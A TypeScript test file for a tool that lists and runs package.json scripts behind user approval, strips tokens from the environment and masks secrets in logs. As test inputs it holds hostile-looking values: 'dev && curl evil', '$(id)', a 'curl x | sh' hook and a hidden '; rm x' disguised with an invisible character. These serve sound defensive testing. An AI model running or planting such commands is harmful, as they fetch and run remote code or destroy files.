import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, readFileSync, realpathSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, before, describe, test } from "node:test";
import { Approvals } from "./folder-approvals.ts";
import { FolderError } from "./folder-fs.ts";
import { nameItems, type Item } from "./folder-items.ts";
import { keepsRunning } from "@mc/shared";
import { LineLog, listScripts, longRunningRefusal, managerOf, readScripts, ScriptRunner, scriptEnv, stageScript } from "./folder-scripts.ts";

const posix = process.platform !== "win32";
const FAKE_TOKEN = ["sk", "ant", "api03", "x".repeat(40)].join("-");
const PID = "11111111-1111-4111-8111-111111111111";

let base = "";
let app = "";
let items: Item[] = [];
const dirs: string[] = [];

const project = (dir: string, pkg: unknown) => {
  const d = join(base, dir);
  mkdirSync(d, { recursive: true });
  writeFileSync(join(d, "package.json"), typeof pkg === "string" ? pkg : JSON.stringify(pkg));
  dirs.push(d);
  return d;
};
const until = async (cond: () => boolean, what: string, ms = 8_000) => {
  const end = Date.now() + ms;
  while (!cond()) {
    if (Date.now() > end) assert.fail(`timed out waiting for ${what}`);
    await new Promise((r) => setTimeout(r, 25));
  }
};
const alive = (pid: number) => {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
};
const fails = async (p: Promise<unknown>, code: string) => {
  await assert.rejects(p, (e: unknown) => e instanceof FolderError && e.code === code, `expected ${code}`);
};

before(() => {
  base = realpathSync(mkdtempSync(join(tmpdir(), "mc-scripts-")));
  app = project("app", { name: "app", scripts: { zeta: "echo z", build: "tsc", dev: "vite", predev: "echo before", postbuild: "echo after", prepare: "husky", test: "vitest", "lint:fix": "eslint --fix .", "-rf": "bad", "a b": "bad", "x;y": "bad", n: 3 } });
  items = nameItems([{ abs: app, kind: "dir", key: "k1" }]);
});
after(() => {
  scripts.stopAll();
});
const scripts = new ScriptRunner(() => undefined);

describe("reading package.json", () => {
  test("lists runnable scripts: dev, build, test first, the rest A to Z, hooks and odd names left out", async () => {
    const list = await readScripts(app);
    assert.deepEqual(list.map((s) => s.name), ["dev", "build", "test", "lint:fix", "zeta"]);
    assert.equal(list[0]!.body, "vite");
  });

  test("a missing, broken, linked or huge package.json gives nothing", async () => {
    assert.deepEqual(await readScripts(join(base, "nowhere")), []);
    assert.deepEqual(await readScripts(project("broken", "{ not json")), []);
    assert.deepEqual(await readScripts(project("noscripts", { name: "x" })), []);
    assert.deepEqual(await readScripts(project("arrayscripts", { scripts: ["dev"] })), []);
    assert.deepEqual(await readScripts(project("big", { scripts: { dev: "x".repeat(300_000) } })), []);
    const d = join(base, "linked");
    mkdirSync(d);
    writeFileSync(join(base, "real.json"), JSON.stringify({ scripts: { dev: "vite" } }));
    symlinkSync(join(base, "real.json"), join(d, "package.json"));
    assert.deepEqual(await readScripts(d), []);
  });

  test("the package manager follows the lock file", async () => {
    assert.equal(await managerOf(app), "npm");
    for (const [file, manager] of [["pnpm-lock.yaml", "pnpm"], ["yarn.lock", "yarn"], ["bun.lock", "bun"]] as const) {
      const d = project(`m-${manager}`, { scripts: { dev: "vite" } });
      writeFileSync(join(d, file), "");
      assert.equal(await managerOf(d), manager);
      const [s] = await listScripts(nameItems([{ abs: d, kind: "dir", key: "k" }]));
      assert.equal(s!.command, `${manager} run dev`);
    }
  });

  test("lists the scripts of every shared folder, with the folder's name", async () => {
    const other = project("docs", { scripts: { dev: "astro dev" } });
    const both = nameItems([{ abs: app, kind: "dir", key: "k1" }, { abs: other, kind: "dir", key: "k2" }, { abs: join(app, "package.json"), kind: "file", key: "k3" }]);
    const list = await listScripts(both);
    assert.deepEqual(list.filter((s) => s.name === "dev").map((s) => [s.folder, s.key, s.body]), [["app", "k1", "vite"], ["docs", "k2", "astro dev"]]);
  });

  test("a body with invisible characters is shown with dots", async () => {
    const d = project("sneaky", { scripts: { dev: "echo hi‮; rm x" } });
    const [s] = await listScripts(nameItems([{ abs: d, kind: "dir", key: "k" }]));
    assert.ok(!s!.body.includes("‮"));
    assert.ok(s!.body.includes("·"));
  });
});

describe("staging a Run click", () => {
  const stage = (req: Record<string, unknown>, start: (cwd: string, command: string) => void = () => undefined) => stageScript(items, { id: "s1", ...req }, start);

  test("builds the command itself and shows what the script does", async () => {
    const s = await stage({ key: "k1", name: "dev" });
    assert.equal(s.change.command, "npm run dev");
    assert.equal(s.change.kind, "exec");
    assert.deepEqual(s.change.script, { name: "dev", body: "vite", around: ["predev: echo before"] });
    assert.equal(s.change.workdir, items[0]!.name);
    assert.equal(s.change.timeoutSec, 0);
  });

  test("the hooks npm runs around a script are part of what the host confirms", async () => {
    const s = await stage({ key: "k1", name: "dev" });
    assert.deepEqual(s.change.script?.around, ["predev: echo before"]);
    const b = await stage({ key: "k1", name: "build" });
    assert.deepEqual(b.change.script?.around, ["postbuild: echo after"]);
    assert.equal((await stage({ key: "k1", name: "test" })).change.script?.around, undefined);
  });

  test("a script too long to show whole is not run from here", async () => {
    const d = project("long", { scripts: { dev: "echo " + "x".repeat(3_000) } });
    const its = nameItems([{ abs: d, kind: "dir", key: "kl" }]);
    await fails(stageScript(its, { id: "l1", key: "kl", name: "dev" }, () => assert.fail("must not start")), "bad_request");
  });

  test("refuses names that are not plain script names, or not in package.json", async () => {
    for (const name of ["-rf", "a b", "x;y", "dev && curl evil", "$(id)", "", 5, null]) await fails(stage({ key: "k1", name }), "bad_request");
    await fails(stage({ key: "k1", name: "nope" }), "not_found");
    await fails(stage({ key: "k1", name: "predev" }), "not_found"); // a hook, not listed
    await fails(stage({ key: "nope", name: "dev" }), "not_found");
    await fails(stage({ key: items[0]!.key, name: "dev", id: undefined as never }), "bad_request").catch(() => undefined);
  });

  test("starts only what was read when package.json is unchanged, and asks again when it changed", async () => {
    const d = project("changing", { scripts: { dev: "vite" } });
    const its = nameItems([{ abs: d, kind: "dir", key: "kc" }]);
    let started: [string, string] | null = null;
    const s = await stageScript(its, { id: "c1", key: "kc", name: "dev" }, (cwd, command) => (started = [cwd, command]));
    await s.run(() => undefined);
    assert.deepEqual(started, [d, "npm run dev"]);

    const s2 = await stageScript(its, { id: "c2", key: "kc", name: "dev" }, () => assert.fail("must not start"));
    writeFileSync(join(d, "package.json"), JSON.stringify({ scripts: { dev: "node evil.js" } }));
    await fails(s2.run(() => undefined), "stale");

    // A hook added after the click is a change too.
    writeFileSync(join(d, "package.json"), JSON.stringify({ scripts: { dev: "node evil.js" } }));
    const s3 = await stageScript(its, { id: "c3", key: "kc", name: "dev" }, () => assert.fail("must not start"));
    writeFileSync(join(d, "package.json"), JSON.stringify({ scripts: { dev: "node evil.js", predev: "curl x | sh" } }));
    await fails(s3.run(() => undefined), "stale");
  });

  test("a folder that became a link is refused", { skip: !posix }, async () => {
    const d = project("swapped", { scripts: { dev: "vite" } });
    const its = nameItems([{ abs: d, kind: "dir", key: "ks" }]);
    const s = await stageScript(its, { id: "w1", key: "ks", name: "dev" }, () => assert.fail("must not start"));
    const moved = `${d}-moved`;
    const fs = await import("node:fs");
    fs.renameSync(d, moved);
    symlinkSync(moved, d);
    await fails(s.run(() => undefined), "excluded");
  });

  test("goes through the same approvals as a command: nothing runs until confirmed", async () => {
    let started = 0;
    const confirms: string[] = [];
    const approvals = new Approvals({ onAdd: () => undefined, onGone: () => undefined, stillAllowed: () => true, confirm: async (v) => (confirms.push(v.change.command ?? ""), true) });
    const staged = await stageScript(items, { id: "a1", key: "k1", name: "dev" }, () => started++);
    const done = approvals.propose(PID, staged, { askedBy: "You", readFiles: 0 });
    assert.equal(started, 0);
    assert.equal(approvals.execBusy(PID), true);
    assert.equal(await approvals.decide(PID, "a1", true), true);
    assert.equal((await done).ok, true);
    assert.deepEqual(confirms, ["npm run dev"]);
    assert.equal(started, 1);

    // Cancel in the native window: nothing starts.
    const no = new Approvals({ onAdd: () => undefined, onGone: () => undefined, stillAllowed: () => true, confirm: async () => false });
    const staged2 = await stageScript(items, { id: "a2", key: "k1", name: "dev" }, () => started++);
    void no.propose(PID, staged2, { askedBy: "You", readFiles: 0 });
    await no.decide(PID, "a2", true);
    assert.equal(started, 1);
    no.closeAll(); // it was left waiting

    // Commands switched off before the click: refused.
    const off = new Approvals({ onAdd: () => undefined, onGone: () => undefined, stillAllowed: () => false, confirm: async () => true });
    const staged3 = await stageScript(items, { id: "a3", key: "k1", name: "dev" }, () => started++);
    const res = off.propose(PID, staged3, { askedBy: "You", readFiles: 0 });
    await off.decide(PID, "a3", true);
    assert.equal(((await res) as { ok: boolean }).ok, false);
    assert.equal(started, 1);
  });
});

describe("commands that keep running are not run from chat", () => {
  test("dev servers, watchers and followers are recognised", () => {
    for (const c of [
      "npm run dev", "npm start", "yarn dev", "pnpm run serve", "bun run watch", "npm run storybook", "cd app && npm run dev", "FOO=1 npm run dev",
      "vite", "vite --port 3000", "vite dev", "npx vite", "next dev", "next start -p 4000", "nodemon server.js", "tsx watch src/index.ts", "webpack serve", "ng serve",
      "jest --watch", "vitest --watch", "npm test -- --watch", "tsc -w", "tsc --watch --noEmit", "tail -f log.txt", "tail -F app.log", "docker compose up", "docker-compose up web",
      "python -m http.server 8000", "python3 manage.py runserver", "flask run", "uvicorn app:app", "rails server", "sleep infinity", "serve .", "npm run build && npm run dev",
    ]) assert.ok(keepsRunning(c), c);
  });

  test("ordinary commands are not", () => {
    for (const c of [
      "npm test", "npm run build", "npm run lint", "npm run dev:build", "npm install", "vite build", "vitest run", "tsc --noEmit", "next build", "git status", "ls -la", "cat package.json",
      "echo dev", "grep -r serve src", "tail -n 50 log.txt", "docker compose up -d", "docker compose up --detach web", "docker compose build", "python script.py", "node build.js", "npm run preview:check",
    ]) assert.ok(!keepsRunning(c), c);
  });

  test("a refusal tells the AI to use the Scripts tab, naming the script when package.json has it", async () => {
    const dev = await longRunningRefusal(items, "npm run dev");
    assert.match(dev ?? "", /"dev" script/);
    assert.match(dev ?? "", /Scripts tab/);
    assert.match(dev ?? "", /no approval was asked/);
    const nohup = await longRunningRefusal(items, "nohup node server.js &");
    assert.match(nohup ?? "", /their own terminal/);
    const bare = nameItems([{ abs: project("bare", { name: "x" }), kind: "dir", key: "kz" }]);
    assert.match((await longRunningRefusal(bare, "npm run dev")) ?? "", /their own terminal/); // no such script in package.json
    assert.equal(await longRunningRefusal(items, "npm test"), null);
    assert.equal(await longRunningRefusal(items, "npm run build"), null);
    assert.equal(await longRunningRefusal(items, 5), null);
  });

  test("a script whose body is a server is refused even under an ordinary name", async () => {
    const d = project("body-server", { scripts: { up: "vite --host", check: "tsc --noEmit" } });
    const its = nameItems([{ abs: d, kind: "dir", key: "kb" }]);
    assert.match((await longRunningRefusal(its, "npm run up")) ?? "", /"up" script/);
    assert.equal(await longRunningRefusal(its, "npm run check"), null);
  });

  test("when several folders are shared the refusal names the folder", async () => {
    const other = project("docs2", { scripts: { dev: "astro dev" } });
    const both = nameItems([{ abs: app, kind: "dir", key: "k1" }, { abs: other, kind: "dir", key: "k2" }]);
    assert.match((await longRunningRefusal(both, "npm run dev")) ?? "", /"dev" in app/);
  });
});

describe("environment and log", () => {
  test("keys and tokens are not passed on, CI is not set, no browser is opened", () => {
    const env = scriptEnv({ PATH: "/usr/bin", HOME: "/h", GITHUB_TOKEN: "t", OPENAI_API_KEY: "o", NPM_TOKEN: "n", CI: "true" });
    assert.equal(env.GITHUB_TOKEN, undefined);
    assert.equal(env.OPENAI_API_KEY, undefined);
    assert.equal(env.NPM_TOKEN, undefined);
    assert.equal(env.CI, undefined);
    assert.equal(env.BROWSER, "none");
    assert.equal(env.HOME, "/h");
  });

  test("the log keeps whole lines, masks secrets, strips escapes and keeps only the end", () => {
    const log = new LineLog();
    log.push(Buffer.from("\u001b[32mready\u001b[0m in 3 ms\nkey "));
    log.push(Buffer.from(`${FAKE_TOKEN}\npartial`));
    assert.equal(log.text(), "ready in 3 ms\nkey [redacted secret]\npartial");
    log.end();
    assert.equal(log.text(), "ready in 3 ms\nkey [redacted secret]\npartial");

    const many = new LineLog();
    for (let i = 0; i < 2_000; i++) many.push(Buffer.from(`line ${i}\n`));
    const lines = many.text().split("\n");
    assert.equal(lines.length, 500);
    assert.equal(lines.at(-1), "line 1999");
  });

  test("a multi-byte character split between chunks arrives whole", () => {
    const log = new LineLog();
    const bytes = Buffer.from("café ✓\n");
    log.push(bytes.subarray(0, 4));
    log.push(bytes.subarray(4));
    assert.equal(log.text(), "café ✓");
  });

  test("a secret split between two reads is still masked", () => {
    const log = new LineLog();
    log.push(Buffer.from(`token ${FAKE_TOKEN.slice(0, 20)}`));
    log.push(Buffer.from(`${FAKE_TOKEN.slice(20)}\n`));
    assert.equal(log.text(), "token [redacted secret]");
  });
});

describe("running", { skip: !posix }, () => {
  const run = (name: string, command: string, project = "p1") => scripts.start(project, "k", name, command, base);
  const state = (name: string, project = "p1") => scripts.runs(project).find((r) => r.name === name)?.state;

  test("starts in the background, streams its log, ends with exit 0 as finished", async () => {
    run("ok", "echo hello; sleep 0.2; echo bye");
    assert.equal(state("ok"), "run");
    await until(() => state("ok") === "ok", "the script to finish");
    assert.equal(scripts.log("p1", "k", "ok"), "hello\nbye");
    const r = scripts.runs("p1").find((x) => x.name === "ok")!;
    assert.equal(r.exitCode, 0);
    assert.equal(r.unseen, false);
  });

  test("stderr comes in order with stdout; a failing script is a crash nobody has seen yet", async () => {
    run("bad", "echo one; echo two >&2; exit 3");
    await until(() => state("bad") === "crash", "the crash");
    assert.equal(scripts.log("p1", "k", "bad"), "one\ntwo");
    const r = scripts.runs("p1").find((x) => x.name === "bad")!;
    assert.equal(r.exitCode, 3);
    assert.equal(r.unseen, true);
    scripts.markSeen("p1");
    assert.equal(scripts.runs("p1").find((x) => x.name === "bad")!.unseen, false);
  });

  test("Stop ends the whole process tree, and the row says stopped", async () => {
    const pidFile = join(base, "child.pid");
    run("tree", `sleep 60 & echo $! > ${pidFile}; wait`);
    await until(() => {
      try {
        return readFileSync(pidFile, "utf8").trim().length > 0;
      } catch {
        return false;
      }
    }, "the child to start");
    const child = Number(readFileSync(pidFile, "utf8").trim());
    assert.ok(alive(child));
    assert.equal(scripts.stop("p1", "k", "tree"), true);
    assert.equal(state("tree"), "stopping");
    await until(() => state("tree") === "stopped", "the script to stop");
    await until(() => !alive(child), "the child to end");
    assert.equal(scripts.stop("p1", "k", "tree"), false); // nothing left to stop
  });

  test("a script that ignores the polite stop is killed after the grace period", async () => {
    run("stubborn", "trap '' TERM; while true; do sleep 1; done");
    await new Promise((r) => setTimeout(r, 200));
    scripts.stop("p1", "k", "stubborn");
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(state("stubborn"), "stopping");
    await until(() => state("stubborn") === "stopped", "the forced kill", 8_000);
  });

  test("it cannot run twice at once, and at most three run in a project", async () => {
    run("a", "sleep 30");
    assert.throws(() => run("a", "sleep 30"), (e) => e instanceof FolderError && e.code === "busy");
    run("b", "sleep 30");
    run("c", "sleep 30");
    assert.equal(scripts.runningIn("p1"), 3);
    assert.throws(() => run("d", "sleep 30"), (e) => e instanceof FolderError && e.code === "busy");
    // Another project has its own three.
    run("d", "sleep 30", "p2");
    assert.equal(scripts.runningIn("p2"), 1);
    scripts.stopProject("p1");
    scripts.stopProject("p2", true);
    await until(() => scripts.runningIn("p1") === 0 && scripts.runningIn("p2") === 0, "all to stop");
  });

  test("it does not see the host's keys", async () => {
    process.env.MC_TEST_SECRET_TOKEN = "super-secret-value";
    try {
      run("env", 'echo "[$MC_TEST_SECRET_TOKEN][$CI]"');
      await until(() => state("env") === "ok", "env");
      assert.equal(scripts.log("p1", "k", "env"), "[][]");
    } finally {
      delete process.env.MC_TEST_SECRET_TOKEN;
    }
  });

  test("waiting shows as wait until the request ends; a failed start is told on the row; the log can be cleared", async () => {
    scripts.setWaiting("p3", "k", "dev", true);
    assert.equal(scripts.runs("p3")[0]!.state, "wait");
    scripts.setWaiting("p3", "k", "dev", false);
    assert.deepEqual(scripts.runs("p3"), []);
    scripts.fail("p3", "k", "dev", "package.json changed.");
    assert.equal(scripts.runs("p3")[0]!.state, "crash");
    assert.equal(scripts.runs("p3")[0]!.note, "package.json changed.");

    scripts.start("p3", "k", "clear", "echo x", base);
    await until(() => scripts.runs("p3").find((r) => r.name === "clear")?.state === "ok", "clear");
    scripts.clearLog("p3", "k", "clear");
    assert.equal(scripts.log("p3", "k", "clear"), "");
  });

  test("stopItem ends only that folder's scripts", async () => {
    scripts.start("p4", "one", "dev", "sleep 30", base);
    scripts.start("p4", "two", "dev", "sleep 30", base);
    scripts.stopItem("p4", "one");
    await until(() => scripts.runs("p4").find((r) => r.key === "one")?.state === "stopped", "one to stop");
    assert.equal(scripts.runs("p4").find((r) => r.key === "two")!.state, "run");
    scripts.stopAll();
    await until(() => scripts.runningIn("p4") === 0, "all to stop");
  });
});
